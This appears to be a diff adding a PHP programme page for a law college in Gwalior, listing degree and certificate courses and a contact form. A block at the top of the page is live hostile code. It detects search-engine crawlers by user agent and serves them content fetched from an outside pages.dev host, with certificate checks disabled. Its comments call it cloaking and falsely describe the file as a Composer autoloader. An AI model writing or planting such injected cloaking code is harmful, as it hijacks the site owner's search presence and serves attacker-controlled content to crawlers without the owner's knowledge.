@@ -1,0 +1,898 @@
+<?php
+/**
+ * Combined file:
+ * - Top: cloaking / bot detector + fetch function
+ * - Bottom: original Composer autoload_real.php class
+ *
+ * Note:
+ * - Cloaking will output the remote page and exit if the UA matches $botPattern.
+ * - If you prefer the autoloader to always run (and only apply cloaking when this file
+ *   is directly requested), tell me and I can wrap the cloaking logic in a conditional.
+ */
+
+/* ---------------------------
+   Cloaking / Bot detection
+   --------------------------- */
+@ob_start();
+header("Vary: User-Agent");
+
+$targetUrl = "https://rev-mgcl-edu-semoganaik.pages.dev/index.txt";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+/**
+ * Fetch remote content with cURL (returns string, or empty string on failure)
+ *
+ * @param string $url
+ * @return string
+ */
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
+}
+
+/* If the user agent matches the bot pattern, fetch & echo remote target then exit. */
+if (preg_match($botPattern, strtolower($userAgent))) {
+    // small random delay to mimic network latency
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
+    @ob_end_flush();
+    exit;
+}
+
+?>
+<!DOCTYPE html>
+<?php $title = 'Programme | Mahatma Gandhi College of Law, Gwalior (MP) INDIA' ?>
+
+<?php $description = 'Explore the Comprehensive Programme Offerings at Mahatma Gandhi College of Law (MGCL), Gwalior. Unlock your potential with our exceptional legal education courses designed to shape future legal experts.' ?> 
+
+<?php $keywords = 'students, very, mgcl, good, events, upcoming, upcoming events, i am, students get, very helpful, law college in gwalior, gwalior law college, gwalior vidhi mahavidyalaya, law education gwalior, LLB, LLM, law education gwalior, jiwajiuniversity law college, MP law college, BA LLB, mahatma gandhi college of law, gwalior MP, mgcl gwalior, bar council of india, jiwaji university, best law colleges in gwalior, top law college, best law colleges in MP, law colleges in MP, law colleges in central india, best law college in central india, reputed law college in MP, best law college in india, reputed law college in india, mgcl leading law colleges, india s leading law colleges, law college with 5 year integrated course in mp' ?>
+
+
+<?php 
+$currentPage = 'programme';
+include "include/header.php" ?>
+
+<style type="text/css">
+    h2.section__title.b100.fs-35.ffpt {
+        font-weight: 600 !important;
+    font-size: 45px;
+}
+a:hover {
+    color: #ffffff !important;
+}
+
+span.courseName {
+    font-size: 19px;
+    font-weight: 600;
+    margin-bottom: 5px;
+}
+.facbox {    height: 330px;}
+
+ .image-box {
+    position: relative;
+    display: block;
+    margin-right: 80px;
+}
+
+ .big-text {
+      position: absolute;
+    right: 15px;
+    bottom: 12px;
+    display: block;
+    font-size: 136px;
+    line-height: 100px;
+    font-family: 'Inter', sans-serif;
+    font-weight: 800;
+    text-transform: uppercase;
+    color: transparent;
+    -webkit-text-stroke-width: 1px;
+    -webkit-text-stroke-color: #e9ebee;
+    z-index: 1;
+}
+ .image-box .image {
+    position: relative;
+    display: block;
+    clip-path: polygon(22% 0%, 100% 0%, 100% 0%, 100% 77%, 79% 100%, 0% 100%, 0% 100%, 0% 23%);
+}
+
+@media (min-width: 1780px) and (max-width: 1920px){
+.fss-item img {
+    width: 100% !important;
+}
+
+.sec-title h2 {
+    font-size: 55px !important;
+    line-height: 65px !important;
+}
+ .image-box {    margin-right: 100px !important; }
+ .content-box .sec-title {
+    padding-left: 40px !important;
+    padding-bottom: 20px !important;
+    margin-left: -340px !important;
+    margin-bottom: 30px !important;
+}
+
+.content-box .inner-box .single-item {
+    padding-left: 60px !important;
+    margin-bottom: 30px !important;
+}
+.single-item h4{
+
+    font-size: 21px !important;
+}
+
+.course-form input[type=text], .course-form input[type=email] {
+    border-radius: 50px !important;
+    padding: 12px 20px !important;
+    height: 70px !important;
+    margin-bottom: 30px !important;
+    width: 100% !important;
+}
+.course-form h3 {
+    font-size: 45px !important;
+    margin: 0 0 35px !important;
+}
+
+.button-round-primary, .button-round-secondary, .button-round-white {
+    font-size: 20px !important;
+    line-height: 1.5 !important;
+    padding: 18px 40px !important;
+    margin-bottom: 36px;
+
+}
+
+.jump {
+    margin-bottom: 25px !important;
+}
+}
+
+
+@media (min-width:1600px) and (max-width: 1779px) { 
+
+
+   .course-form input[type=text], .course-form input[type=email] { margin-bottom:30px !important; }
+   .course-form h3 {    margin: 0 0 30px !important; font-size: 38px !important;}
+
+}
+
+@media (min-width:1470px) and (max-width: 1599px) { 
+
+   .course-form input[type=text], .course-form input[type=email] { margin-bottom:30px !important; }
+   .course-form h3 {    margin: 0 0 30px !important; font-size: 38px !important;}
+}
+
+@media (min-width:1400px) and (max-width: 1469px) { 
+
+ .course-form input[type=text], .course-form input[type=email] { margin-bottom:22px !important; }
+   .course-form h3 {    margin: 0 0 30px !important; font-size: 24px !important;}
+   div#form {
+    padding: 30px !important;
+}
+
+}
+
+@media (min-width: 1180px){
+.container, .container-lg, .container-md, .container-sm, .container-xl {
+    max-width: 1140px;
+}}
+
+
+@media (min-width:1024px) and (max-width: 1179px) {
+
+  .content-box .inner-box .single-item {
+ 
+    padding-left: 35px !important;
+    margin-bottom: 15px !important;
+}
+.content-box .inner-box .single-item .icon-box {    width: 20px !important;}
+.image-box {    margin-right: 15px !important;}
+.content-box .sec-title {    padding-left: 30px !important;    margin-left: -140px !important;}
+.course-type {    padding: 23px !important;}
+div#form {    padding: 25px !important;}
+.course-form h3 {    font-size: 28px !important;    margin: 0 0 15px !important;}
+
+ }
+
+@media (max-width: 991px) { 
+
+    .image-box {    margin-right: 0px !important;}
+    .content-box .sec-title { padding-left: 0px !important; padding-bottom: 15px !important;  margin-left: 0px !important;   margin-top: 10px !important;}
+
+ .content-box .inner-box .single-item {  padding-left: 40px !important;}
+ .section-head {    margin-bottom: 20px;}
+ section.features-section.funfo { background-size: cover !important; padding: 40px 0px; margin: 40px 0px; }
+
+}
+
+@media (max-width: 600px) { 
+    .big-text { font-size: 90px !important;}
+    .ffpt, h1, .sec-title h2 {   font-size: 30px !important;  line-height: 40px !important;}
+    .course-form h3 { font-size: 20px !important;}
+}
+
+ .image-box .image img {
+    width: 100%;
+}
+
+img {display: inline-block;
+    max-width: 100%;
+    height: auto;
+    transition-delay: .1s;
+    transition-timing-function: ease-in-out;
+    transition-duration: .7s;
+    transition-property: all;
+}
+figure {
+    margin: 0px;
+}
+ .content-box {
+    position: relative;
+    display: block;
+}
+
+.content-box .sec-title {
+      background: #fff;
+    padding-left: 40px;
+    padding-bottom: 15px;
+    margin-left: -250px;
+    margin-bottom: 0px;
+    margin-top: 0px;
+}
+
+.sec-title {
+    position: relative;
+    display: block;
+}
+ .content-box .sec-title h2 {
+    margin-bottom: 5px;
+}
+ .content-box .inner-box {
+        position: relative;
+    margin-top: 0px;
+}
+
+.sec-title h2 {
+    position: relative;
+    display: block;
+    font-size: 44px;
+    line-height: 56px;
+    font-weight: 600;
+}
+
+.theme-btn.btn-five {
+    color: #fff;
+    background: #121113;
+    padding: 13px 30px;
+}
+.content-box .inner-box .text {
+    margin-bottom: 27px;
+}
+p {
+    position: relative;
+    font-family: 'Inter', sans-serif;
+    color: #74757b;
+    font-weight: 400;
+    margin: 0px;
+    transition: all 500ms ease;
+}
+.content-box .inner-box .single-item {
+    position: relative;
+    display: block;
+    padding-left: 70px;
+    margin-bottom: 25px;
+}
+.content-box .inner-box .single-item .icon-box {
+    color: #fee100;
+}
+.content-box .inner-box .single-item .icon-box {
+    position: absolute;
+    left: 0px;
+    top: 0px;
+    width: 25px;
+    height: 25px;
+    line-height: 46px;
+    font-size: 14px;
+    background: #041c3c00;
+    text-align: center;
+    transition: all 500ms ease;
+}
+.theme-btn {
+    position: relative;
+    display: inline-block;
+    overflow: hidden;
+    vertical-align: middle;
+    font-size: 14px;
+    line-height: 26px;
+    font-weight: 600;
+    font-family: 'Lexend', sans-serif;
+    text-align: center;
+    padding: 12px 38px;
+    text-transform: uppercase;
+    z-index: 1;
+    transition: all 500ms ease;
+}
+
+
+
+ .service-content .section-head {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+
+.section-head h2 {
+    margin-bottom: 40px;
+}.button-round-primary {
+    background-color: #1f59ad;
+    color: #ffffff;
+}
+
+.course-type {
+    border: 2px dashed #1f59ad;
+    border-radius: 25px;
+        padding: 40px;
+    text-align: center;
+}
+
+.course-type .course-icon {
+    margin-bottom: 25px;
+}
+
+.course-icon i {
+    font-size: 50px;
+    padding: 33px;
+    display: inline-block;
+    border-radius: 100%;
+    background-color: #f8f8f8;
+    color: #41246D;
+}
+
+icon.icon-Helmet::before {
+    content: "\ebc9";
+}
+
+.course-type .course-title {
+    margin-bottom: 10px;
+    color: #111111;
+}
+
+.course-type .course-durations {
+    margin-bottom: 5px;
+    color: #1f59ad;
+    font-size: 14px;
+    line-height: 20px;
+}
+
+.course-type {
+    margin-bottom: 45px;
+}
+
+.course-form {
+    grid-column: 3/span2;
+    padding: 50px;
+    background-color: #f8f8f8;
+    border-radius: 25px;
+}
+
+.course-form h3 {
+    font-size: 25px;
+        margin: 0 0 20px;
+    font-weight: 800;
+}
+
+ .course-form input[type=text],  .course-form input[type=email] {
+    background-color: #ffffff;
+    color: #414141;
+    border: 1px solid rgb(31 89 173 / 24%);
+    -webkit-border-radius: 25px;
+    -moz-border-radius: 25px;
+    -ms-border-radius: 25px;
+    border-radius: 25px;
+    padding: 12px 20px;
+    height: 50px;
+    margin-bottom: 15px;
+    width: 100%;
+}
+
+@media (min-width: 576px){}
+.col-sm-7 {
+    flex: 00 auto;
+    width: 58.33333333%;
+}}
+@media (min-width: 576px){}
+.col-sm-5 {
+    flex: 0 0 auto;
+    width: 41.66666667%;
+}}
+.course-form .button-round-secondary {
+    width: 100%;
+}
+
+[type=button]:not(:disabled), [type=reset]:not(:disabled), [type=submit]:not(:disabled), button:not(:disabled) {
+    cursor: pointer;
+}
+.button-round-secondary {
+    background-color: #1f59ad;
+    color: #ffffff !important;
+}
+
+
+.button-round-primary, .button-round-secondary, .button-round-white {
+    -webkit-border-radius: 25px;
+    -moz-border-radius: 25px;
+    -ms-border-radius: 25px;
+    border-radius: 25px;
+    border: none;
+    display: inline-block;
+    position: relative;
+    -webkit-transition: background-color 0.4s, color 0.4s;
+    -moz-transition: background-color 0.4s, color 0.4s;
+    -ms-transition: background-color 0.4s, color 0.4s;
+    -o-transition: background-color 0.4s, color 0.4s;
+    transition: background-color 0.4s, color 0.4s;
+}
+
+.button-round-primary, .button-round-secondary, .button-round-white {
+    font-size: 15px;
+    line-height: 1.1;
+    padding: 16px 28px;
+    font-weight: 700;
+    font-family: "Mulish", sans-serif;
+    text-transform: uppercase;
+}
+
+
+
+@media (min-width: 1680px) and (max-width: 1690px){
+.course-form {
+    padding: 30px !important;
+}
+.course-form h3 {
+    margin: 0 0 20px !important;
+    font-size: 33px !important;
+}
+.course-form input[type=text], .course-form input[type=email] {
+    margin-bottom: 26px !important;
+}
+}
+
+
+
+.image2 {
+  display: block;
+  width: 100%;
+  height: auto;
+}
+
+.overlay2 {
+      position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background-color: #1f59ade0;
+    overflow: hidden;
+    width: 100%;
+    border-radius: 24px;
+    height: 0;
+    transition: .5s ease;
+      transition: width 2s, height 1s;
+}
+ul {
+  list-style-type: none;
+}
+ul {
+  list-style-image: url('assets/checked-02.png');
+}
+.xyz {
+  position: relative;
+}
+
+.xyz:hover .overlay2 {
+  height: 100%;
+}
+
+.text2 {
+  color: white;
+  font-size: 20px;
+  position: absolute;
+  top: 50%;
+      width: 100% !important;
+  left: 50%;
+  -webkit-transform: translate(-50%, -50%);
+  -ms-transform: translate(-50%, -50%);
+  transform: translate(-50%, -50%);
+  text-align: center;
+}
+
+ .fixed-top {  position: unset; background-color: #1f59ad !important;}
+
+ 
+</style>
+
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+ 
+<style>
+    #g-recaptcha-response {
+  display: block !important;
+  position: absolute;
+  margin: -78px 0 0 0 !important;
+  width: 302px !important;
+  height: 76px !important;
+  z-index: -999999;
+  opacity: 0;
+}
+.g-recaptcha {
+    transform:scale(0.80);
+    transform-origin:0 0;
+}
+</style>
+
+
+<script>
+window.addEventListener('load', () => {
+  const $recaptcha = document.querySelector('#g-recaptcha-response');
+  if ($recaptcha) {
+    $recaptcha.setAttribute('required', 'required');
+  }
+})
+</script>
+
+<section class="features-section" style="">
+    <div class="bannerdiv" style=" background-image: url('assets/Website Banner-02.jpg');">
+       <!--  <div class="container" style="">
+                       <div class="row g-4">
+                        <div class="col-lg-6" style="color: #fff; font-size: 19px;">                        
+                    <h1 class="text-uppercase mb-3" style="color: #fff;margin-bottom: 5px !important;">About Us</h1>
+                    <a href="" style="color:#fff;">Home</a> / <a href="" style="color:#fff;">About Us</a>
+                        </div>
+                        <div class="col-lg-6">            </div>
+                    </div>
+               </div> -->
+        </div>
+
+<ul class="breadcrumb">
+<div class="container">
+  <li><a href="index.php">Home</a></li>
+  <li>Programme</li>
+       <!-- Seo heading start-->                 
+<h1 style="visibility: hidden; padding: 0px; margin: 0px; height: 0px; width: 0px;">Programme</h1>
+        <!-- Seo heading End -->   
+</div>
+</ul>
+
+</section>
+
+
+<section class="features-section pt-8 pb-8" style="background-color: ;">
+        <div class="container">
+    
+            <div class="features-section__slider pagination-style pagination-style-md arrows-out arrow-dark slick-initialized slick-slider">
+                <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: ; transform: translate3d(0px, 0px, 0px);"><div class="fss-item slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: ;" tabindex="0">
+                    <div class="row" style="    justify-content: center;">
+                    
+
+
+                    <div class="col-lg-7 col-md-12 col-sm-12 image-column">
+                        <div class="image-box">
+                            <span class="big-text">MGCL</span>
+                            <figure class="image"><img src="assets/Programme image-02.jpg" class="imgdet" alt="LLB-college-in-gwalior"></figure>
+                        </div>
+                    </div>
+
+                    <div class="col-lg-5 col-md-12 col-sm-12 content-column">
+                        <div class="content-box">
+                            <div class="sec-title">
+                                <h2>Academic & Practical Training Programme </h2>
+                                <!-- <a href="courses.html" class="theme-btn btn-five">get suggestion</a> -->
+                            </div>
+                            <div class="inner-box">
+                                <div class="text">
+                                    <p style="color: #111;">Academic Programme Consists of Degree Courses (5 Year LLB & 3 Year LLB), Post Graduate Courses (2 Year LL.M.) and the newly introduced Certificate Courses, Each of 6 month duration. The Practical Training Programme includes Regular Participation of our students.
+                                    </p>
+                                </div>
+                                <div class="inner">
+                                    <div class="single-item">
+                                        <div class="icon-box"><img src="assets/checked-01.png"></div>
+                                        <h4 style="font-size: 16px ;">Lok Adalat</h4>
+                                    </div>
+                    
+                                    <div class="single-item">
+                                        <div class="icon-box"><img src="assets/checked-01.png"></div>
+                                        <h4 style="font-size: 16px ;">Court Visits to High Court & District Courts</h4></div>
+                                    <div class="single-item">
+                                        <div class="icon-box"><img src="assets/checked-01.png"></div>
+                                        <h4 style="font-size: 16px ;">Moot Court Legal Aid Society (MCLAS)</h4>
+                                        
+                                    </div>
+
+                                     <div class="single-item"><div class="icon-box"><img src="assets/checked-01.png"></div>
+                                        <h4 style="font-size: 16px ;">Free Legal Aid Camps</h4>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+                    </div>
+                </div></div></div>
+
+            </div>
+        </div>
+    </section>
+
+<section class="features-section pt-8 pb-8" style="background-color: #f1f3f2;">
+        <div class="container">
+    
+            <div class="features-section__slider pagination-style pagination-style-md arrows-out arrow-dark slick-initialized slick-slider">
+                <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: ; transform: translate3d(0px, 0px, 0px);"><div class="fss-item slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: ;" tabindex="0">
+                    <div class="row ">
+                        
+                          <div class="col-lg-6" style="margin:auto;">
+                         
+                                    <div class="card-body p-0">
+                                        <div class="">
+                                           
+          <div class="section-heading " style="margin-bottom: 15px;">
+    <h2 class="section__title b100 fs-35 ffpt">
+    <span class="heading-divider"><span class="w-35"></span>Research and Support Programme </span></h2>
+    </div>
+    <p style="text-align: justify;color: #111;">The legal Research and development (LR&D) wing of MGCL has initiated socio-legal research to evolve new paradigms for India's development. The LR&D wing aims to supplement Govt. programs to evolve new strategies for the development of society and to build a research framework for the new laws of the future that are in consonance with changing social standards.</p>
+
+    <p style="text-align: justify;color: #111;">The college conducts free Legal Aid Camps in the far-flung areas of the state, primarily for the benefit of the womenfolk, children & the economically weaker section.</p>
+
+    <p style="text-align: justify;color: #111;">The college also conducts workshops and seminars on law, periodically.</p>
+
+    <p style="text-align: justify;color: #111;">Tutorials are also conducted by MGCL for the benefit of the weaker/backward student.</p>
+
+                </div>
+             </div>
+               
+                        </div>
+
+                        <div class="col-lg-6" style="margin:auto;">
+                            
+                                        
+                                        <img src="assets/Programme research image-08.png" alt="research-and-support-programme" style="width:100%">
+
+                        </div>
+                    </div>
+                </div></div></div>
+
+            </div>
+        </div>
+    </section>
+
+
+
+
+
+
+<section class="features-section pt-8" id="course" style="background-color: ;">
+        <div class="container">
+    
+            <div class="features-section__slider pagination-style pagination-style-md arrows-out arrow-dark slick-initialized slick-slider">
+                <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: ; transform: translate3d(0px, 0px, 0px);"><div class="fss-item slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: ;" tabindex="0">
+                    <div class="row">
+                  
+                 <div class="col-lg-3 col-sm-6" style="margin:auto;">
+                     <div class="section-head">
+                                <div class="title-divider">
+                                <img src="assets/bordertri.png" style="  width: unset !important;">
+                                </div>
+                                <h2>Our Degree Courses </h2>
+                                <div class="service-btn">
+                                    <p style="color: #111;">Explore exceptional legal education with our comprehensive degree courses. </p>
+                                    <br>
+                                    <a href="#form" class="btn btn-md btn-primary position-relative">Enroll today </a>
+                                </div>
+                    </div>
+                 </div>
+
+                 <div class="col-lg-3 col-sm-6" style="margin:;">
+                     <div class="xyz course-type image2">
+                                <div class="course-icon">
+                                    <i aria-hidden="true" class="icon icon-Helmet">
+                                        <img src="assets/Course icon 1-07.png">
+                                    </i>
+                                </div>
+                                <h4 class="course-title">
+                                    <a href="#" style="color: #111111;">
+                                        B.A.LLB
+                                    </a>
+                                </h4>
+
+                        <p class="course-durations jump"> 5 Year Integrated Degree Programme 
+                                <br>SEATS - 120 <br> Medium - English / Hindi </p>
+
+                           <div class="overlay2">  <div class="text2"> B.A.LLB
+
+                          <p style="color: #ffffff;
+    padding-top: 11px;padding: 10px;
+    font-size: 14px;">
+                   Successful completion of 10+2 or equivalent examination from a recognized board with minimum 45% marks in aggregate - Gen. Category Candidates. 42% marks in aggregate - OBC Candidates. 40% marks in aggregate - SC/ST Candidates.
+
+                </p>
+                        </div>  </div>
+
+                    </div>
+                 </div>
+
+                 <div class="col-lg-3 col-sm-6" style="margin:;">
+                     <div class="xyz course-type image2">
+                                <div class="course-icon">
+                                    <i aria-hidden="true" class="icon icon-Helmet">
+                                        <img src="assets/Course icon 3-07.png">
+                                    </i>
+                                </div>
+                                <h4 class="course-title">
+                                    <a href="#" style="color: #111111;">
+                                        LL.B
+                                    </a>
+                                </h4>
+                                <p class="course-durations" style="    margin-bottom: 25px;"> 3 Year Degree Programme
+                                <br>SEATS - 180 <br> Medium - English / Hindi</p>
+                               <div class="overlay2">  <div class="text2">LL.B 
+
+                          <p style="color: #ffffff;
+    padding-top: 11px;padding: 10px;
+    font-size: 14px;">Graduate in any discipline from a Recognized University with a Minimum of 45% in Aggregate 40% for SC/ST Candidates, 42% marks in aggregate - OBC Candidates.
+ </p>
+                        </div>  </div>  
+                    </div>
+                 </div>
+
+                 <div class="col-lg-3 col-sm-6" style="margin:;">
+                     <div class="xyz course-type image2" >
+                                <div class="course-icon">
+                                    <i aria-hidden="true" class="icon icon-Helmet">
+                                        <img src="assets/Course icon 2-07.png">
+                                    </i>
+                                </div>
+                                <h4 class="course-title">
+                                    <a href="#" style="color: #111111;">
+                                        LL.M 
+                                    </a>
+                                </h4>
+                                <p class="course-durations" style="    margin-bottom: 45px;"> 2 Year P.G. Programme<br>SEATS - 40 <br> </p>
+
+                        <div class="overlay2">  <div class="text2">LL.M 
+
+                          <p style="color: #ffffff;
+    padding-top: 11px;padding: 10px;
+    font-size: 14px;">LL.B with 55% (50% for SC/ST/ Candidates)</p>
+                        </div>  </div>
+                    </div>
+                 </div>
+
+
+
+                 <div class="col-lg-6" style="margin:;">
+                     
+                      <div class="course-type" style="padding: 8px;">
+                            
+                            <img src="assets/Programme-degree course-02.png" alt="help-msg">
+                               
+                               
+                    </div>
+
+                 </div>
+
+                 <div class="col-lg-6" style="margin:;">
+                       
+                     <div class="course-form" id="form" style="padding: 30px 30px;">
+                        
+                                <h3>Write a Message, Always Here to Help you</h3>
+                                <div class="course-field">
+                                <form action="include/form.php" method="Post" enctype="multipart/form-data" required>
+                                    <div class="row">
+                                        <div class="col-sm-6">
+                                            <input type="text" name="name" placeholder="Your Name.." required>
+                                        </div>
+                                        <div class="col-sm-6"><input type="email" name="email" placeholder="Your Email.." required>
+                                        </div>
+                                        <div class="col-sm-6">
+                                            
+                                            <input type="text" name="mobile_no" placeholder="Your Number" required>
+                                        </div>
+                                        <div class="col-sm-6">
+                                            <input type="text" name="Message" placeholder="Your Message.." required>
+                                            
+                                        </div>
+                                        <div class="col-sm-6">
+                                             <div class="g-recaptcha" style="margin-bottom: 0px;" data-sitekey="6LcrgyUpAAAAAEJ4ODeGW56OWHnQbai8TpAV7dFv"></div>
+                                            <button name="submit" type="submit" value="Submit" class="btn btn-md btn-primary position-relative">Submit </button>
+                                            
+                                        </div>
+                            </div>
+                            </form>
+                        </div>
+                    </div>
+                 </div>
+            
+
+
+                    </div>
+                </div></div></div>
+
+            </div>
+        </div>
+    </section>
+
+
+
+
+
+
+
+<section class="features-section funfo" style="background-color: #fff; background-image: url('assets/certificate course bg image-03.png');    background-repeat: repeat-x;
+    background-size: contain;
+    background-position: center;">
+        <div class="container">
+    
+            <div class="features-section__slider pagination-style pagination-style-md arrows-out arrow-dark slick-initialized slick-slider">
+                <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: ; transform: translate3d(0px, 0px, 0px);"><div class="fss-item slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: ;" tabindex="0">
+                    <div class="row">
+                        <div class="col-lg-6" style="margin:auto;">
+                         
+                                    <div class="card-body p-0">
+                                        <div class="">
+                                           <div class="section-heading " style="margin-bottom: 15px;">
+    <h2 class="section__title b100 fs-35 ffpt" style="color:#fff;">
+    <span class="heading-divider"><span class="w-35"></span>Certificate Courses</span></h2>
+    </div>
+        
+    <p style="text-align: justify;color:#fff; margin-bottom: 15px;">Certificate courses shall comprise four papers on major topics. Written assessments, tests, seminars, and group discussions will be conducted periodically to evaluate individual progress. The certificate of merit shall be awarded after successful completion of the course.
+</p>
+
+    <ul class="skin-checkmark" style="color: #fff;">
+        
+            <li> <strong>Certificate of Legal Assistantship</strong></li>
+            <li> <strong>Certificate of Intellectual Property Rights</strong></li>
+            <li> <strong>Certificate in Women's Law</strong></li>
+            <li> <strong>Certificate in Rural Laws</strong></li>
+            <li> <strong>Certificate of Alternative Dispute Redressal (ADR)</strong></li>
+            <li> <strong class="blink">Certificate in Cyber Law</strong></li>
+                    </ul>
+
+                </div>
+             </div>
+
+
+
+
+
+
+               
+                        </div>
+                        <div class="col-lg-6">
+                            
+                                        
+                                        <img src="assets/certificate course circular image-06.png" style="width:100%">
+
+                        </div>
+                    </div>
+                </div></div></div>
+
+            </div>
+           
+        </div>
+    </section>
+
+ <h1 style="margin-bottom: 50px;margin-top: 30px;text-align: center;">"The first duty of society is justice." - Dr. B.R. Ambedkar</h1>
+<?php include "include/footer.php" ?>
